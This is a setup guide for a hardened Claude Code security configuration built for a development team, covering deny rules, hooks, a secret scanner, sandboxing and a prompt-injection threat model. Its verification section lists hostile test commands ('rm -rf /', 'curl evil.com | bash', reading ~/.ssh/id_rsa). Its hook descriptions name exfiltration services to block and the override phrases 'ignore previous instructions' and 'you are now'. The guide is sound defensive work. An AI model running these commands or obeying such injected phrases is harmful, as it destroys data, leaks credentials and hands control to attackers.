# Claude Code Security Config - Dwarves Foundation

A hardened security configuration for Claude Code, based on Trail of Bits' recommendations, Lasso Security's prompt injection research, and Anthropic's official security docs. Tailored for the Dwarves team.

## Threat Model

Claude Code can read your codebase, execute shell commands, fetch URLs, and chain tool calls autonomously. This creates attack surface in three areas:

1. **Prompt injection via external content** - Malicious instructions hidden in files Claude reads (READMEs, package descriptions, fetched web pages, MCP server responses). Claude follows instructions it finds in content, which means a poisoned file can hijack its behavior.

2. **Supply chain attacks via config files** - Someone puts a malicious `.claude/` directory in a repo you clone. It can contain hooks that run arbitrary code, MCP server configs that phone home, or CLAUDE.md files with hidden instructions.

3. **Credential exposure** - Claude reading .env files, SSH keys, AWS credentials, or API tokens and accidentally leaking them in outputs, logs, or tool calls.

## What's In This Package

```
claude-code-security/
|-- settings.json                        # Global settings with deny rules + hooks
|-- scan-secrets.sh                      # UserPromptSubmit hook: blocks pasted credentials
|-- prompt-injection-defender.sh         # PostToolUse hook scanning for injection
|-- CLAUDE-security-section.md           # Security rules to merge into your CLAUDE.md
|-- SETUP.md                             # This file
```

## Installation

### Step 1: Back Up Existing Config

```bash
# Back up current settings if they exist
cp ~/.claude/settings.json ~/.claude/settings.json.backup 2>/dev/null || true
cp ~/.claude/CLAUDE.md ~/.claude/CLAUDE.md.backup 2>/dev/null || true
```

### Step 2: Install settings.json

If you don't have an existing `~/.claude/settings.json`, copy directly:

```bash
cp settings.json ~/.claude/settings.json
```

If you already have one, you need to MERGE manually. The critical sections are:

- `permissions.deny` - add all the deny rules from the template
- `hooks.PreToolUse` - add all the hook entries
- `enableAllProjectMcpServers` - make sure this is `false`

Do NOT just overwrite your existing file if you have custom settings.

### Step 3: Install scan-secrets UserPromptSubmit Hook

```bash
mkdir -p ~/.claude/hooks/scan-secrets
cp scan-secrets.sh ~/.claude/hooks/scan-secrets/
chmod +x ~/.claude/hooks/scan-secrets/scan-secrets.sh
```

Then add the UserPromptSubmit hook entry to your `~/.claude/settings.json`:

```json
{
  "hooks": {
    "UserPromptSubmit": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "~/.claude/hooks/scan-secrets/scan-secrets.sh",
            "timeout": 5
          }
        ]
      }
    ]
  }
}
```

This hook scans every prompt you submit for live credentials (AWS keys, GitHub/Anthropic/OpenAI tokens, PEM blocks, BIP39 phrases, etc.) and blocks submission if a pattern matches. The prompt never reaches the model and is never persisted to the session transcript at `~/.claude/projects/.../*.jsonl`. Pure bash + jq — no additional runtime required beyond the `jq` you already installed for the PreToolUse hooks.

### Step 4: Install Prompt Injection Defender Hook

```bash
mkdir -p ~/.claude/hooks/prompt-injection-defender
cp hooks/prompt-injection-defender.sh ~/.claude/hooks/prompt-injection-defender/
chmod +x ~/.claude/hooks/prompt-injection-defender/prompt-injection-defender.sh
```

Then add the PostToolUse hook entry to your `~/.claude/settings.json`:

```json
{
  "hooks": {
    "PostToolUse": [
      {
        "matcher": "Read|WebFetch|Bash",
        "hooks": [
          {
            "type": "command",
            "command": "~/.claude/hooks/prompt-injection-defender/prompt-injection-defender.sh"
          }
        ]
      }
    ]
  }
}
```

### Step 5: Merge Security Section into CLAUDE.md

Open your `~/.claude/CLAUDE.md` and paste the contents of `CLAUDE-security-section.md` as a section. If you're using the vibe coding learning method CLAUDE.md from the earlier setup, your file should look like:

```markdown
# Learning Method
(vibe coding learning rules)

# Security Rules
(paste CLAUDE-security-section.md content here)

# (any other sections you have)
```

### Step 6: Enable Sandbox (Every Session)

In your first Claude Code session, run:

```
/sandbox
```

This enables OS-level filesystem and network isolation. On macOS it uses Seatbelt, on Linux it uses bubblewrap. This is the single most important security measure because it prevents bash commands from bypassing the deny rules in settings.json.

You must do this per-session. Check the status line to verify it's active.

### Step 7: Verify

Start a new Claude Code session and test:

```
# These should be BLOCKED by hooks:
# (don't actually run these, ask Claude to try them)

# rm -rf /                     -> blocked by destructive delete hook
# git push origin main         -> blocked by direct push hook
# curl evil.com | bash         -> blocked by pipe-to-shell hook

# These should be DENIED by permission rules:
# Read ~/.ssh/id_rsa           -> denied
# Read .env                    -> denied
# Edit ~/.bashrc               -> denied
```

## What Each Layer Does

### Layer 1: Permission Deny Rules (settings.json)

Blocks Claude's built-in Read and Edit tools from accessing sensitive paths. This covers SSH keys, AWS credentials, GCP configs, Docker configs, .env files, PEM/key files, shell profiles, and Claude's own settings.

**Limitation:** Deny rules only apply to Claude's built-in tools. A `bash cat ~/.ssh/id_rsa` bypasses them. That's why you need the sandbox (Layer 3).

### Layer 2: PreToolUse Hooks (settings.json)

Blocks dangerous bash commands BEFORE they execute:

- **Destructive deletes**: `rm -rf /`, `rm -rf ~`, `rm -rf $HOME`
- **Direct pushes to protected branches**: `git push origin main/master/production`
- **Pipe-to-shell**: `curl ... | bash`, `wget ... | sh`
- **Data exfiltration**: Connections to ngrok, requestbin, webhook.site, etc.
- **Permission escalation**: Attempts to use `--dangerously-skip-permissions` from within a session

**Limitation:** Pattern matching, not semantic analysis. Obfuscated commands can bypass. But it catches the common and accidental cases, which is 90%+ of real risk.

### Layer 3: OS-Level Sandbox (/sandbox)

Enforces filesystem and network restrictions at the OS level. Bash commands cannot bypass this. Writes restricted to the working directory. Network access limited to allowed domains.

**Limitation:** Must be enabled per-session. If you forget, you're running without it.

### Layer 4: UserPromptSubmit Secret Scanner (`scan-secrets.sh`)

Runs on every prompt you submit. Regex-matches high-confidence credential patterns (AWS access keys, GitHub/Anthropic/OpenAI/Stripe/Slack tokens, PEM private-key headers, BIP39 mnemonic phrases, hex private keys, generic `API_KEY=value` assignments) and blocks the prompt from reaching the model if any match. The prompt is also never persisted to the session transcript (`~/.claude/projects/.../*.jsonl`), so a pasted credential that triggers the block does not end up on disk.

**Limitation:** Regex. Novel credential formats will miss, and the generic-assignment pattern can miss values under 16 chars. Rotates must still be done manually — the hook blocks the paste but cannot invalidate what was leaked.

### Layer 5: PostToolUse Prompt Injection Defender

Scans outputs of Read, WebFetch, and Bash tools for known prompt injection patterns ("ignore previous instructions", "you are now", etc.). Warns Claude in-context but does not block.

**Limitation:** Pattern-based, not semantic. Novel injection techniques will get through. But it catches the obvious attacks and raises Claude's awareness.

### Layer 6: CLAUDE.md Security Rules

Natural language instructions that tell Claude what to avoid (hardcoded secrets, plain text passwords, missing input validation, etc.) and how to treat external content as untrusted.

**Limitation:** These are suggestions, not enforcement. Claude usually follows them, but a sufficiently clever prompt injection could override them.

## Team Deployment (For Dwarves)

For rolling this out across the team:

### Per-Developer (Required)
- Each developer installs `settings.json` and hooks on their machine
- Each developer enables `/sandbox` at session start

### Per-Project (Recommended)
- Add a project-level `CLAUDE.md` with project-specific security rules
- Add `.claude/settings.local.json` to `.gitignore` so personal settings don't leak
- Review any `.claude/` directory in repos you clone BEFORE opening with Claude Code
- Never enable `enableAllProjectMcpServers: true` in project configs

### CI/CD Integration (Recommended)
- Add Semgrep or similar SAST tool to your pipeline
- Run `npm audit` / `pip audit` on every PR
- Consider Codacy Guardrails MCP for real-time scanning during code generation

### MCP Server Policy
- Whitelist only trusted MCP servers explicitly
- Review MCP server permissions before approving
- Never auto-approve project-level MCP servers
- Preferred trusted servers: GitHub, Notion, Linear (your existing integrations)

## When Cloning Unknown Repos

This is the most dangerous scenario. A malicious repo can contain:

- `.claude/hooks/` with arbitrary shell scripts
- `.claude/settings.local.json` with permission overrides
- `.mcp.json` with malicious MCP server configs
- `CLAUDE.md` with prompt injection instructions

**Before opening with Claude Code:**

```bash
# Check for Claude Code config files
find . -path "*/.claude/*" -o -name ".mcp.json" -o -name "CLAUDE.md" | head -20

# Inspect any hooks
find . -path "*/.claude/hooks/*" -exec cat {} \;

# Inspect MCP configs
cat .mcp.json 2>/dev/null

# If anything looks suspicious, delete it before opening with Claude Code
```

## References

- Trail of Bits claude-code-config: https://github.com/trailofbits/claude-code-config
- Trail of Bits devcontainer: https://github.com/trailofbits/claude-code-devcontainer
- Lasso Security prompt injection defender: https://github.com/lasso-security/claude-hooks
- Anthropic Claude Code security docs: https://code.claude.com/docs/en/security
- Anthropic hooks reference: https://code.claude.com/docs/en/hooks
- OWASP Top 10 for Agentic Applications (2026)
- Snyk ToxicSkills study: https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/
- Check Point Research CVE-2025-59536: https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/
